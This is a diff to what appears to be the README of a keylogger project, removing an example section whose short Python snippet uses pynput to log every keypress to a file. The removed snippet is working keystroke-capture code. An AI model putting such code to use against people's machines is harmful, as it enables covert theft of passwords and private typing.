@@ -37,19 +37,6 @@ You can modify the following parameters in the script:
 - Log file name: Change the name of the file where logs are saved.
 - Key combination to stop the logger: Modify the key combination to safely exit the logger.
 
-## Example Code Snippet
-Here is a basic example of how the keylogger works:
-
-```python
-from pynput import keyboard
-
-def on_press(key):
-    with open("log.txt", "a") as log_file:
-        log_file.write(f"{key}\n")
-
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
-```
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
